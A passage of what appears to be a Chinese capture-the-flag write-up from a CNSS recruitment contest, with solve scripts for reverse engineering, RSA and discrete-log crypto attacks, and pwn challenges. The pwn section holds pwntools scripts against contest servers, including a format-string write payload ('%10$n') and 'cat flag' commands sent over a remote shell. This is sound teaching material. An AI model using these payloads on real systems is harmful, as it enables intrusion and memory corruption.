而负数采用补码方式存储，存储结果大概是111111111111100000（1和0的个数乱打的），对应FF（全1），而修改会把指针对应大小的字节空间全部修改，这里buf的存储空间地址连续，导致将后面全部变成全1。但这仅限指针大小的空间，也就是说如果buf有0x11位，执行后buf[0x11]应该会是0吧。 Stage 3 (*(unsigned long long **)\u0026puc)++;等价于puc = (char *)puc + 8;，因为我用ida看了，因为ull是8位，强制类型转换后++就把指针加上了8位到达了ubuf中值为0x80的位置 而后面执行相加操作把第一位变成了0x80 当i加到一定大小的时候会有奇怪的事情发生：ubuf并没有那么大，但ubuf与buf存储空间地址连续，推测pc指针在指向ubuf的最后一位之后指向了buf的第一位，继续执行加法导致了这样的输出。 CNSS{1n7er3stin9_P0int3r} ","date":"2021-10-07","objectID":"/cnssrecruit/:3:6","tags":null,"title":"CNSS招新赛游记","uri":"/cnssrecruit/"},{"categories":null,"content":"0x07 meta_game 好耶，这个题是Shino的一血！ Patch program入门题 把前面那些没用的函数都暴力删掉，留下最后一个能输出flag的函数。发现有1%的概率运行即可得到flag。 那不如放弃思考！反正我运行了20几次就有flag了 cnss{0f3b82c6c7f1808e3e464ebe338c71e0} ","date":"2021-10-07","objectID":"/cnssrecruit/:3:7","tags":null,"title":"CNSS招新赛游记","uri":"/cnssrecruit/"},{"categories":null,"content":"0x08 encoder 好耶，这个题是Shino的一血！ 逆！ 看到有个数组内容是\"ABCD……abcd….01234…..+=/\"，盲猜base64. 但是没解出来。下断点动态调试看一眼发现表被改了。把密文替换成对应位置的原表字符直接base64解密就行了。 cnss{U_ArE_g0od_at_REvErSe} ","date":"2021-10-07","objectID":"/cnssrecruit/:3:8","tags":null,"title":"CNSS招新赛游记","uri":"/cnssrecruit/"},{"categories":null,"content":"0x09 CSS 大师第一步 好耶，这个题是Shino的一血！ 用眼睛看，发现有一些乘法，一些加法，然后发现有一些东西我们可以设成1. 假设一个数要是1，而且他等于一些变量相乘，那么那些变量都得是1 假设一个数要是1，而且他等于一些变量相加，那么那些变量中有且仅有一个是1 写个程序把css代码读入进来，并且把形如\"一些数中有且仅有一个是1\"的约束条件输出，发现其实很好手算，手算得到答案。 #include \u003cbits/stdc++.h\u003eusing namespace std; string lis[171] = {\"--2eead\", \"--68b16\", \"--bd92b\", \"--8eb64\", \"--fec8a\", \"--f6579\", \"--12447\", \"--65353\", \"--1bbf5\", \"--42d17\", \"--86526\", \"--00c17\", \"--d961b\", \"--c7e32\", \"--bcdac\", \"--3bf8d\", \"--7ce1b\", \"--4d92b\", \"--eef0f\", \"--b488f\", \"--33fa7\", \"--2bbe3\", \"--5bb71\", \"--3384e\", \"--5e2ce\", \"--bdbac\", \"--d75a1\", \"--0624d\", \"--1c582\", \"--2b916\", \"--28633\", \"--d5cb1\", \"--81e26\", \"--d7225\", \"--1d2b3\", \"--4f67a\", \"--084e9\", \"--ae4af\", \"--e9d11\", \"--05d82\", \"--4daa1\", \"--54887\", \"--fe35a\", \"--12e13\", \"--a8471\", \"--ec4c9\", \"--c9228\", \"--d4655\", \"--03f15\", \"--22cba\", \"--9c47e\", \"--68930\", \"--191cc\", \"--6d330\", \"--6b658\", \"--0e125\", \"--8bfeb\", \"--62771\", \"--c4575\", \"--beba0\", \"--bb2bb\", \"--c0c00\", \"--48322\", \"--8cbdf\", \"--71216\", \"--95a2a\", \"--6748b\", \"--5ed01\", \"--db963\", \"--8ed74\", \"--e0019\", \"--7f4b5\", \"--6b4a8\", \"--3bf7a\", \"--ad937\", \"--96afc\", \"--4c8b7\", \"--d660c\", \"--f5e87\", \"--63e08\", \"--afd50\", \"--b9e3e\", \"--e1d99\", \"--161ea\", \"--bc078\", \"--dfc3b\", \"--45812\", \"--75c62\", \"--0cd13\", \"--60d47\", \"--6b99d\", \"--acbb8\", \"--9f815\", \"--46fd1\", \"--ff63e\", \"--e8a89\", \"--98720\", \"--0fe50\", \"--4ad76\", \"--81a61\", \"--f3ea9\", \"--49059\", \"--14e69\", \"--f0ffe\", \"--7bb49\", \"--29580\", \"--99e12\", \"--ec297\", \"--00241\", \"--6c431\", \"--78082\", \"--3b5b5\", \"--6b426\", \"--2d350\", \"--90d05\", \"--70006\", \"--2fd1b\", \"--9823e\", \"--e68b7\", \"--d0d96\", \"--14b57\", \"--ebd5f\", \"--a4f2b\", \"--097e7\", \"--d4401\", \"--e9c7d\", \"--1e967\", \"--286e7\", \"--1290c\", \"--7f952\", \"--d6061\", \"--2607e\", \"--25631\", \"--df315\", \"--111ff\", \"--dd697\", \"--f6822\", \"--9b112\", \"--f1471\", \"--ff9fc\", \"--714de\", \"--b28be\", \"--33348\", \"--9ee6e\", \"--f81ec\", \"--a8c08\", \"--0eb94\", \"--7cf78\", \"--3366b\", \"--a43bf\", \"--7a377\", \"--28b62\", \"--69fe1\", \"--ee762\", \"--cb980\", \"--091c0\", \"--bad61\", \"--428f4\", \"--ddee7\", \"--642a2\", \"--b379c\", \"--b2a13\", \"--62a0f\", \"--b32a6\", \"--5bb37\", \"--04466\", \"--4d61b\", \"--91408\", \"--40a02\", \"--03300\", \"--8ada7\"}; struct data { string buf[20]; int type, tot; }; string s1 = \"--dd1bd\"; string s2 = \"--28e99\"; string s3 = \"--5588f\"; string to_be[500]; int tot2; //type = 0: 0 //type = -1: I can change it! //type = 1: 1 //type = 2: + //type = 3: * map \u003cstring, int\u003e ref; int idx = 0; map \u003cstring, int\u003e ref2; data dat[10001]; int make_1(string name) { int id = ref[name]; if(dat[id].type == 0) return -1; if(dat[id].type == 1) return 1; if(dat[id].type == -1) { int ii = -1; for(int i = 0; i \u003c 171; ++i) if(lis[i] == name) { ii = i; break; } ii = ii / 9 * 9; for(int i = ii; i \u003c ii+9; ++i) dat[ref[lis[i]]].type = 0; dat[id].type = 1; cout \u003c\u003c name \u003c\u003c endl; return 1; } if(dat[id].type == 3) { for(int i = 0; i \u003c dat[id].tot; ++i) if(make_1(dat[id].buf[i]) == -1) puts(\"ERROR\"); } if(dat[id].type == 2) { int flag = 0; for(int i = 0; i \u003c dat[id].tot; ++i) if(dat[ref[dat[id].buf[i]]].type == 1) { flag = 1; break; } if(flag == 0) { for(int i = 0; i \u003c dat[id].tot; ++i) if(dat[ref[dat[id].buf[i]]].type == -1) { to_be[++tot2] = dat[id].buf[i]; cout \u003c\u003c ref2[to_be[tot2]] / 9 + 2 \u003c\u003c \" \" \u003c\u003c ref2[to_be[tot2]] % 9 + 1\u003c\u003c endl; } cout \u003c\u003c \"========\\n\"; //if(flag == 0) puts(\"ERROR\"); } } return 1; } int main() { freopen(\"read.txt\", \"r\", stdin); freopen(\"outp.txt\", \"w\", stdout); while(1) { string line, name = \"\"; getline(cin, line); if(line[0] == 'd') break; for(int i = 0; i \u003c 7; ++i) name += line[i]; ref[name] = ++idx; if(line[9] == '0') dat[idx].type = 0; if(line[9] == '1') dat[idx].type = 1; if(line[9] == 'c') { int len = line.size(); for(int i = 9; i \u003c len; ++i) { if(line[i] == '-' \u0026\u0026 line[i-1] != '-') { string tmp = \"\"; for(int j = i; j \u003c i+7; ++j) tmp += line[j]; dat[idx].buf[dat[idx].tot++] = tmp; } if(line[i] == '+') dat[idx].type = 2; if(line[i] == '*') dat[idx].type = 3; } } } for(int i = 0; i \u003c 171; ++i) { ref2[lis[i]] = i; dat[ref[lis[i]]].type = -1; } make_1(","date":"2021-10-07","objectID":"/cnssrecruit/:3:9","tags":null,"title":"CNSS招新赛游记","uri":"/cnssrecruit/"},{"categories":null,"content":"0x0? 生瓜蛋子 一进来先被进行了一个下马威 用眼睛去瞪，观察到call的两个sub程序好像都没有什么意思，但是有一个令人在意的call loc_401619 跳转过去，发现有一些意义不明的数据 推测是一段代码，按C翻译成汇编： 其实这个时候我们已经可以看到代码中有一些干扰程序反编译的花指令了，但是由于这个部分可以直接用眼睛去瞪，所以我并没有进行这部分程序的修复。看到wrong和congratulations字符串，推测这只是一个负责比较的函数。我们想要看到的是核心代码。观察发现这个call loc_401725是一个还没看过的地方，而且这个程序大概率返回了比较结果。跳转过去看看。 尝试按P键创建函数，发现失败了。在图中我们可以看到一些“花指令”：他们尝试跳转到一个编译器无法识别的地址，导致反汇编无法继续进行。我们只需要利用patch program让他们全部变成nop即可。 iret并不是，我圈多了。 修复完大概长这个样子。但是这个地方我们nop完之后出现了一个db，可能导致后面的代码反汇编不正确。需要重新搞一遍，从db开始依次按C反汇编成代码。 这样，令人费解的东西就消失了。按P创建函数，按F5反编译成C语言，整理一下变成这样：（前面是一连串的赋值） 其中那几个sub程序进行了一些运算，和我没有什么关系，直接复制调用就行了。 其中v7是已知的，Str2推测是我们输入的数据。得到以下关系： Str2[i] ^ ((v4+v5)%0xFFFF) = Str1[i] ^ v8 则Str2[i] = Str1[i] ^ v8 ^ ((v4+v5)%0xFFFF) 其中v4和v5都可以通过i计算得到。v8是由Str2的几位通过计算得来的，有些棘手。但是v8在255之内，直接暴力枚举，输出每个v8对应的答案。最后可以在一堆乱码中找到flag。 #include \u003cbits/stdc++.h\u003eusing namespace std; int __cdecl sub_4018E6(int a1) { int result; // eax if ( a1 ) result = a1 * sub_4018E6(a1 - 1); else result = 2; return result; } int __cdecl sub_40190D(int a1); int __cdecl sub_40193A(int a1) { int result; // eax if ( a1 ) result = sub_40190D(a1 - 1) + 3; else result = 3; return result; } int __cdecl sub_40190D(int a1) { int result; // eax if ( a1 \u003e 0 ) result = sub_40193A(a1 - 1) + a1 + 1; else result = 1; return result; } //直接复制的 int a[32] int main() { a[0] = -40; a[1] = -34; a[2] = -23; a[3] = 87; a[4] = 26; a[5] = 43; a[6] = 99; a[7] = -81; a[8] = -83; a[9] = -53; a[10] = -20; a[11] = 108; a[12] = -22; a[13] = 58; a[14] = 72; a[15] = 59; a[16] = 42; a[17] = -104; a[18] = 122; a[19] = -95; a[20] = 43; a[21] = -122; a[22] = -125; a[23] = 85; a[24] = -118; a[25] = -34; a[26] = 44; a[27] = 60; a[28] = 37; a[29] = -111; a[30] = -65; a[31] = -13; freopen(\"output.txt\", \"w\", stdout); int v3, v4, v5; for ( int i = 0; i \u003c= 31; ++i ) { v3 = sub_4018E6(i); v4 = sub_40190D(i) * v3; v5 = sub_40193A(i); a[i] ^= ((v4+v5)%0xFFFF); } for(int v8 = 0; v8 \u003c= 255; ++v8) { for(int i = 0; i \u003c= 31; ++i) putchar(a[i]^v8); putchar('\\n'); } } 眼力大挑战！ cnss{We1Come_To_ReVErze_w0rld!!} ","date":"2021-10-07","objectID":"/cnssrecruit/:3:10","tags":null,"title":"CNSS招新赛游记","uri":"/cnssrecruit/"},{"categories":null,"content":"0x0A Baby Exception 打开ida用大眼瞪，可以发现代码中被插入了一些int 3。这是一种动态反调试技术：当程序正常运行的时候INT3异常将被交给进程本身执行，但在DEBUGGER运行的时候，这一异常将被交给DEBUGGER处理，导致程序本身的异常处理程序不被运行，导致运行结果不同。 IDA的绕过方法我不会！但是运用ollydbg的话仅需设置忽略INT3异常将异常交给进程处理即可获得正确的数据。 获得正确的data和key之后，用眼睛瞪可以发现这是一个AES加密，用网上的轮子跑一跑得到答案。 from Crypto.Cipher import AES from binascii import b2a_hex, a2b_hex def add_to_16(text): if len(text.encode('utf-8')) % 16: add = 16 - (len(text.encode('utf-8')) % 16) else: add = 0 text = text + ('\\0' * add) return text.encode('utf-8') def encrypt(text): key = '\\x4D\\x4C\\x57\\x4E\\x46\\x7C\\x19\\x0A\\x4D\\x4C\\x57\\x4E\\x46\\x7C\\x7B\\x67'.encode('utf-8') mode = AES.MODE_ECB text = add_to_16(text) cryptos = AES.new(key, mode) cipher_text = cryptos.encrypt(text) return cipher_text def decrypt(text): key = '\\x4D\\x4C\\x57\\x4E\\x46\\x7C\\x19\\x0A\\x4D\\x4C\\x57\\x4E\\x46\\x7C\\x7B\\x67'.encode('utf-8') mode = AES.MODE_ECB cryptor = AES.new(key, mode) plain_text = cryptor.decrypt(a2b_hex(text)) return bytes.decode(plain_text).rstrip('\\0') if __name__ == '__main__': e = b'\\x96\\x7f\\x37\\x7c\\x26\\x30\\x03\\xeb\\x61\\x6d\\xa3\\xda\\x0c\\x77\\x3e\\x7c\\xdf\\x18\\x5d\\x4e\\xd9\\xbe\\x0a\\x5c\\x02\\x36\\x87\\x37\\xb4\\x2f\\xb1\\x9f' e = b2a_hex(e) d = decrypt(e) print(\"解密:\", d) cnss{s3h_v3h_b0th_ez_r1ght?__:)} ","date":"2021-10-07","objectID":"/cnssrecruit/:3:11","tags":null,"title":"CNSS招新赛游记","uri":"/cnssrecruit/"},{"categories":null,"content":"Crypto ","date":"2021-10-07","objectID":"/cnssrecruit/:4:0","tags":null,"title":"CNSS招新赛游记","uri":"/cnssrecruit/"},{"categories":null,"content":"大大超人的代码 I 题意即求： $$ ax ≡b(mod\\ n) $$ 则 $$ x≡b/a(mod n) $$ from Crypto.Util.number import long_to_bytes a = 10499958999037877045860819145654592139531258013786800315952660437695953206118177802362538707257147839843929607571065996701775308516344320494492623326535070933404552245238889019529867495706219558537483959855018656456767601472852530792072968424254995263689863458109858200434368660199825370006622972172615283000225895986795432100524830372657448639751748649746517567275491877758341825114165092719349624453145256163927226959292249202574111889453838454722039 n = 24482146465492008075985247474612414320648047425785643838292024343856484727961531014143038475016832753633643464040872815615028679515938203288641456487330618969964445990607887042678786725649115551121279019558561466028015891949399125083811735238746137986294864917479675168130071009961552443914582290960081092498541343026165888900247802180370535720495152921978143267961988522304615862013752399728187062523671938698800778472385717512452760615330027345844283 b = 13974352443151 print(long_to_bytes(b*pow(a, n-2, n))) cnss{you yi ge ren qian lai mai gua. lue lue lue lue lue. sa ri lang, sa ri lang. ei, hua qiang, hua qiang} ","date":"2021-10-07","objectID":"/cnssrecruit/:4:1","tags":null,"title":"CNSS招新赛游记","uri":"/cnssrecruit/"},{"categories":null,"content":"大大超人的代码 II 题意即求num的欧拉函数值。使用sagemath，有手就行。 print(euler_phi(num)) cnss{7b4a23cf05fc166e2f5e6798d737cb83} ","date":"2021-10-07","objectID":"/cnssrecruit/:4:2","tags":null,"title":"CNSS招新赛游记","uri":"/cnssrecruit/"},{"categories":null,"content":"EZRSA RSA，e=3.一个低加密指数攻击 $$ m^3≡c(mod\\ n) $$ $$ m^3 = kn+c $$ 枚举k，直到kn+c开三次方根开出整数即可。 from gmpy2 import iroot from Crypto.Util.number import long_to_bytes import libnum e = 3 n = 17122915166265113628936084259612311876364779252333817653908064563012403283413723801149226058776045562431863561527598029708484050735340376592692944196636066937254842628374596659520832392883941088961925998112268354069528298108259950738233300271339429579172788606259082714089126140552788081701431773946954101521880287079138683872063436125499187482930254182605546821908768554127091588674102227605591868183216588952297634056187432224500652151699978753316630287127751214117068167697654397115835061787620207935678045116272234790320727737354518224845334305441037073149880267837099939565780539222758100209016162314144630920799 c = 16926458617386458077637050106018850896006879092288192701331681605474802210713231004923465605065133301881405183688853792875133217926741592214428875953305593414362683885848278980412814134018268287018200015497631362139676275057736654215717198437649465165438442373537289011460247398965575656801213891887710880496787600356785377725103473390014610976378061619695088235473509 k = 0 while 1: res = iroot(c+k*n,e) if(res[1] == True): print(long_to_bytes(res[0]).decode()) break k=k+1 ","date":"2021-10-07","objectID":"/cnssrecruit/:4:3","tags":null,"title":"CNSS招新赛游记","uri":"/cnssrecruit/"},{"categories":null,"content":"True Random 众所周知，只要随机数种子一样，生成的随机数过程就会一样。所以我们只需要把程序反着写一遍就可以了。这是一个逆向题？ import random seeds = [6756, 949, 8167, 2246, 9307, 4748, 9651, 1460, 3867, 5744, 5815, 713, 1057, 5614, 4024, 8075, 3862, 732, 279, 5308, 7815, 2251, 5533, 6324, 6786, 8549, 4421, 6651, 7409, 4880, 6246, 1249, 192, 4099, 1704, 3678, 7520, 1378, 2642, 9154, 5690, 8621, 1717, 4992, 8903, 1608, 3214, 2565, 3146, 2521, 2070, 1047, 5784, 8682, 1057, 1091, 8655, 2957, 8591, 1284, 9162, 2974, 9395] res = [8, 221, 50, 176, 21, 79, 19, 208, 117, 8, 51, 171, 156, 247, 101, 60, 46, 152, 162, 182, 29, 16, 102, 154, 22, 117, 65, 21, 121, 197, 170, 2, 217, 118, 201, 15, 132, 246, 21, 1, 250, 7, 45, 130, 124, 231, 200, 103, 7, 63, 86, 159, 211, 168, 82, 11, 60, 173, 209, 168, 191, 255, 101] for i in range(len(res)): for j in range(i+1, len(res)): res[j] ^= res[i] for i in range(0, len(res)): random.seed(seeds[i]) rands = [] for j in range(0, 4): rands.append(random.randint(0, 255)) print(chr(res[i] ^ rands[i%4]) cnss{Trust me!This is turely random!!!!TURELY RANDOMMMMMM!!!!!} ","date":"2021-10-07","objectID":"/cnssrecruit/:4:4","tags":null,"title":"CNSS招新赛游记","uri":"/cnssrecruit/"},{"categories":null,"content":"基地遭到攻击 一个base64加密的变种。我的程序丢了，这个题就鸽了吧。 cnss{This_is_a_strange_switch_of_Base} ","date":"2021-10-07","objectID":"/cnssrecruit/:4:5","tags":null,"title":"CNSS招新赛游记","uri":"/cnssrecruit/"},{"categories":null,"content":"Smooth Criminal 题意：求一个离散对数。使用sagemath秒杀。 discrete_log(h, mod(g, p)) cnss{You_have_got_Pohilg_Hellman!} ","date":"2021-10-07","objectID":"/cnssrecruit/:4:6","tags":null,"title":"CNSS招新赛游记","uri":"/cnssrecruit/"},{"categories":null,"content":"大大超人的代码Ⅲ 求最小的x，使： $$ a^x≡b^y(mod\\ p) $$ 设p的原根为g，则可以做如下变换： $$ xlog_ga≡ylog_gb(mod\\ \\phi(p)) $$ 其中phi(p)=p-1。 设： $$ a'≡log_ga(mod\\ \\phi(p)) $$ $$ b'≡log_gb(mod\\ \\phi(p)) $$ 转化为： $$ xa'≡yb'(mod\\ \\phi(p)) $$ 则只需要找到最小的x，使： $$ gcd(b', \\phi(p))|xa' $$ 可以得到： $$ x=\\frac{gcd(b',\\phi(p))}{gcd(b', a', \\phi(p))} $$ import gmpy2 import random p = 941958815880242161 g = 103 def f(a, b): if a == 0 or b == 0: return 0 S = set() prod = b while(prod not in S): S.add(prod) prod = prod * b % p ret = 1 prod = a while(prod not in S): ret = ret + 1 prod = prod * a % p return ret def f2(a, b): if a == 0 or b == 0: return 0 newa = discrete_log(a, mod(g, p)) newb = discrete_log(b, mod(g, p)) return gcd(newb, p-1)/gcd(gcd(newb, p-1), newa) flag = 0 mask = (1 \u003c\u003c 128) - 1 k1, k2 = (12345678987654321, 98765432123456789) for i in range(1000): s = \"\" for i in range(10): k1, k2 = ((k1 * k1 + k2) \u0026 mask, (k2 * k2 + k1) \u0026 mask) s += str(f2(k1 % p, k2 % p)) print(int(s)) flag ^= int(s) print(flag) 虽然显示是python，但这是Sagemath代码。 ","date":"2021-10-07","objectID":"/cnssrecruit/:4:7","tags":null,"title":"CNSS招新赛游记","uri":"/cnssrecruit/"},{"categories":null,"content":"ECDLP 搜这五个字就搜到了原题，跑一遍过了，咋回事呢。 cnss{S4G3\u0026P0h1i9} ","date":"2021-10-07","objectID":"/cnssrecruit/:4:8","tags":null,"title":"CNSS招新赛游记","uri":"/cnssrecruit/"},{"categories":null,"content":"那个男人！！！ 一个Shamir’s Secret Sharing. 观察发现，构造了一个系数全是质数的多项式f(x)，每次发送1可以得到类似f(num)=result的信息，求出多项式的常数项系数即可得到答案。 众所周知，当方程个数大于未知数个数，我们就可以求出所有的未知数。由于不知道这个多项式有多少项，我们直接进行一个300次的1的发送得到300个方程直接跑高斯消元解（当然你也可以写多点求值），然后多跑几遍赌一赌，万一某一次生成的未知系数个数真的小于等于300就可以得到flag了。 from pwn import * from hashlib import sha256 from gmpy2 import is_prime lib = \"QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890\" p = remote(\"101.32.29.195\", 9999) st = p.recv().decode() las = st[18:34] sha = st[39:103] print(st) print(las) print(sha) print(p.recv()) def calculate_parameter(a, prm, n): for i in range(n): p = i for j in range(i+1, n): if a[j][i] \u003e a[p][i]: p = j for j in range(n+1): tmp = a[i][j] a[i][j] = a[p][j] a[p][j] = tmp for j in range(n): if not i == j: tt = a[j][i] * pow(a[i][i], prm-2, prm) for k in range(i, n+1): a[j][k] = (a[j][k] - a[i][k] * tt % prm + prm) % prm res = [] for i in range(n): res.append(a[i][n] * pow(a[i][i], prm-2, prm) % prm) return res n = 62 flag = 0 for i1 in range(n): for i2 in range(n): for i3 in range (n): for i4 in range(n): shaa = str(sha256((lib[i1]+lib[i2]+lib[i3]+lib[i4]+las).encode()).hexdigest()) if shaa == sha: print(lib[i1]+lib[i2]+lib[i3]+lib[i4]) flag = 1 p.sendline((lib[i1]+lib[i2]+lib[i3]+lib[i4]).encode()) break if flag == 1: break if flag == 1: break if flag == 1: break if flag == 0: print(\"Not Found!\") #=====End of Prove of Work===== print(p.recvline()) print(p.recvline()) print(p.recvline()) x = p.recvline() prm = int(x.decode()[8:]) print(x) print(prm) nms = [] rss = [] t = 300 for i in range(t): p.recv() p.sendline(\"1\".encode()) p.recv() x = p.recvline().decode() #print(x) pos = 0 m = len(x) for j in range(75, m): if x[j] == ',': pos = j nms.append(int(x[5:pos])) rss.append(int(x[pos+2:len(x)-2])) print(\"{t}Done\") secret = -1 aa = [] bb = [] for i in range(t): aa = [] for j in range(t): aa.append(pow(nms[i], j, prm)) aa.append(rss[i]) bb.append(aa) #print(bb) print(\"Start solving...\") solves = calculate_parameter(bb, prm, t) print(solves) secret = solves[0] while not is_prime(secret): secret = secret + prm print(secret) print(\"DONE!!!!\") print(p.recv()) p.sendline(\"2\".encode()) print(p.recv()) p.sendline(str(secret).encode()) print(p.recv()) print(p.recv()) cnss{Lagrange_i5_one_of_My_favour1te} ","date":"2021-10-07","objectID":"/cnssrecruit/:4:9","tags":null,"title":"CNSS招新赛游记","uri":"/cnssrecruit/"},{"categories":null,"content":"RSA II 第一层e很大，推测是一个低解密指数攻击。但是n被factordb直接草出来了，咋回事呢。 第二层是一个裸的Coppersmith's short padding attack def short_pad_attack(c1, c2, e, n): PRxy.\u003cx,y\u003e = PolynomialRing(Zmod(n)) PRx.\u003cxn\u003e = PolynomialRing(Zmod(n)) PRZZ.\u003cxz,yz\u003e = PolynomialRing(Zmod(n)) g1 = x^e - c1 g2 = (x+y)^e - c2 q1 = g1.change_ring(PRZZ) q2 = g2.change_ring(PRZZ) h = q2.resultant(q1) h = h.univariate_polynomial() h = h.change_ring(PRx).subs(y=xn) h = h.monic() kbits = n.nbits()//(2*e*e) diff = h.small_roots(X=2^kbits, beta=0.5)[0] # find root \u003c 2^kbits with factor \u003e= n^0.5 return diff def related_message_attack(c1, c2, diff, e, n): PRx.\u003cx\u003e = PolynomialRing(Zmod(n)) g1 = x^e - c1 g2 = (x+diff)^e - c2 def gcd(g1, g2): while g2: g1, g2 = g2, g1 % g2 return g1.monic() return -gcd(g1, g2)[0] c1 = 25273007066020189408109545229904933542261476876009872439710113415858837573395525630415777935344105797142851844145072854811848998350900372253971849285971326186079657861753281055419024685971559366012439288855412385839773710368571132729119276524681516954047015289030441158082956015073955156160324687579087140475 c2 = 59742662912819263048476842525911792774606722595876218353030983190479211608519746735628199156539097538888609903705813533259650335449835222582640654777700444326609516992455668845647841850293730999545553827474883338490920161461753350303815384773788647536170704446255770720919964851226435888665577313224159779663 n = 67530919003139966773553200011128742490294797009276982165948531486788511785120120505106383097675618844859048245902703407886773958024692000896590916622934616822563863757961613349221514066937957870378716994349709221655837122691033725689519576287720351954630419028668871186060611604084354574970069046834491765983 e = 7 diff = short_pad_attack(c1, c2, e, n) M = related_message_attack(c1, c2, diff, e, n) print(M) 这是一个sage代码。 cnss{0x10001_getPrime_invert_pow_long_to_bytes} ","date":"2021-10-07","objectID":"/cnssrecruit/:4:10","tags":null,"title":"CNSS招新赛游记","uri":"/cnssrecruit/"},{"categories":null,"content":"一些对没开的题的推测做法 RSA I 这个题应该是搜索剪枝一下可以直接出p和q CNSS Crypto Service 这个题网上是有现成的解法的。完全一模一样的题目。 大大超人的代码Ⅳ 我推测我大大超人的代码Ⅲ的做法是可以通过这个题的。加个求原根的代码? ","date":"2021-10-07","objectID":"/cnssrecruit/:4:11","tags":null,"title":"CNSS招新赛游记","uri":"/cnssrecruit/"},{"categories":null,"content":"Pwn 这次的Pwn我只做了一开始放的那些题，后面放的题全都没看，， ","date":"2021-10-07","objectID":"/cnssrecruit/:5:0","tags":null,"title":"CNSS招新赛游记","uri":"/cnssrecruit/"},{"categories":null,"content":"0x01 Net cat 我怎么不记得我做过这题？不会是nc一下直接出结果吧 cnss{The_first_step_of_Pwn!} ","date":"2021-10-07","objectID":"/cnssrecruit/:5:1","tags":null,"title":"CNSS招新赛游记","uri":"/cnssrecruit/"},{"categories":null,"content":"0xFF roshambo 有手就行 from pwn import * p = remote('120.25.225.38', 2556) print(p.recv()) print(p.recv()) p.send('\\n') for i in range(50): str = p.recv().decode() print(str) if i \u003c 9: pos = 9 else: pos = 10 if str[pos] == 'r': p.sendline(\"cloth\".encode()) if str[pos] == 's': p.sendline(\"rock\".encode()) if str[pos] == 'c': p.sendline(\"scissors\".encode()) print(p.recv()) p.sendline(\"cat flag\".encode()) print(p.recv()) print(p.recv()) print(p.recv()) cnss{Just_a_easy_case_of_pwn_tools} ","date":"2021-10-07","objectID":"/cnssrecruit/:5:2","tags":null,"title":"CNSS招新赛游记","uri":"/cnssrecruit/"},{"categories":null,"content":"0x02 Baby_ROP ROP。这个题代码我好像没存。 cnss{The_first_step_of_Pwn!} ","date":"2021-10-07","objectID":"/cnssrecruit/:5:3","tags":null,"title":"CNSS招新赛游记","uri":"/cnssrecruit/"},{"categories":null,"content":"0x03 抽奖 格式化字符串漏洞。详见代码 from pwn import * p = remote(\"120.25.225.38\", 3222) r = p.recv()[21:] print(r) r = r[:14] print(r) r = int(r, 16) print(hex(r)) payload = b'a'*42 + b'%10$n' + p64(r) #首先将'%10$n'部分换成'%10$p'输出地址，前面的数字暴力枚举直到打出的地址正确。 print(p.recv()) p.sendline(payload) print(p.recv()) p.sendline(p64(r)) print(p.recv()) print(p.recv()) p.sendline(\"cat flag\".encode()) print(p.recv()) cnss{a800bbff3efbf427b55804141ca42a51} ","date":"2021-10-07","objectID":"/cnssrecruit/:5:4","tags":null,"title":"CNSS招新赛游记","uri":"/cnssrecruit/"},{"categories":null,"content":"Misc 本来都打算军训期间不写题了，但这些题确实蛮有意思又忍不住开了几个。 ","date":"2021-10-07","objectID":"/cnssrecruit/:6:0","tags":null,"title":"CNSS招新赛游记","uri":"/cnssrecruit/"},{"categories":null,"content":"Hello World - 1 #include \u003cstdio.h\u003eint main() { puts(\"Hi, CNSS!\"); } 不会有人看不懂吧 ","date":"2021-10-07","objectID":"/cnssrecruit/:6:1","tags":null,"title":"CNSS招新赛游记","uri":"/cnssrecruit/"},{"categories":null,"content":"Hello World - 2 #include \u003cstdio.h\u003eint main() { putchar(72); putchar(105); putchar(44); putchar(32); putchar(67); putchar(78); putchar(83); putchar(83); putchar(33); } 转化成ASCII码输出就是了 ","date":"2021-10-07","objectID":"/cnssrecruit/:6:2","tags":null,"title":"CNSS招新赛游记","uri":"/cnssrecruit/"},{"categories":null,"content":"Hello World - 3 #include \u003cstdio.h\u003eint main() { while(puts(\"Hi, CNSS!\") \u0026\u0026 0) {} } 一看就懂 ","date":"2021-10-07","objectID":"/cnssrecruit/:6:3","tags":null,"title":"CNSS招新赛游记","uri":"/cnssrecruit/"},{"categories":null,"content":"MOD 3 有意思。 首先我不会做，但我知道我的编译器一定会做（众所周知汇编代码没有模运算）。首先写如下程序： int main() { int x = 114514; x = x % 3; } 编译成exe，用ida逆向，然后再翻译回C语言： int mod3(int x) { unsigned long long t = 2863311531; return x - ((x * t) \u003e\u003e 33) * 3; } 好神奇，我也不知道为什么会这样。 但是其中不能出现-和*，考虑使用位运算代替。 首先考虑-。众所周知，-a = ~a+1（补码），可以转化成加法。 然后考虑*。众所周知，\u003c\u003c操作可以让一个数乘上2的整数次幂，而t是常数，考虑直接二进制分解。 然后我们的代码变成了这样： int mod3(int x) { unsigned long long ans = x; ans = (ans+(ans\u003c\u003c1)+(ans\u003c\u003c3)+(ans\u003c\u003c5)+(ans\u003c\u003c7)+(ans\u003c\u003c9)+(ans\u003c\u003c11)+(ans\u003c\u003c13)+(ans\u003c\u003c15)+(ans\u003c\u003c17)+(ans\u003c\u003c19)+(ans\u003c\u003c21)+(ans\u003c\u003c23)+(ans\u003c\u003c25)+(ans\u003c\u003c27)+(ans\u003c\u003c29)+(ans\u003c\u003c31)); //ans = ans * t; ans \u003e\u003e= 33; ans = (ans\u003c\u003c1)+ans; //ans *= 3 ans = ~ans+1; //ans = -ans ans = x + ans; } （其实我的代码并不是这样写的，为了方便理解我进行了一个分步。） 本来按理来说到这里就大功告成了， 但是我负数算爆了。因为我正数完全都彳亍，所以考虑先取绝对值，然后到最后再负回来。 百度一下。abs(x) = (x ^ (x \u003e\u003e 31)) + (~(x \u003e\u003e 31)+1)（用前文方法转化减法） 但是我们不能使用if。咋办呢。考虑取x的符号位sgn，则sgn = ((unsigned) x \u003e\u003e 31)（负数为1，正数为0） 考虑构造一个数s，这个数的每一位都是sgn（即若x是正数s为全0，若x为负数s为全1） 假设答案是ans，则我们只需要ans = ((~s)\u0026ans)+(s\u0026(~ans+1));即可实现和if等价的效果（可以自己推一推） 如何构造s呢？ 当然，你可以s=sgn+(sgn\u003c\u003c1)+(sgn\u003c\u003c2)+(sgn\u003c\u003c3)...........+(sgn\u003c\u003c31)，但这样就一瞬超过符号个数限制了。考虑倍增构造： s=sgn; s=(s\u003c\u003c1)+s; //11或00 s=(s\u003c\u003c2)+s; //1111或0000 s=(s\u003c\u003c4)+s; //11111111或00000000 s=(s\u003c\u003c8)+s; //同理 s=(s\u003c\u003c16)+s;//同理 得到完整代码： int mod3(int x) { int s 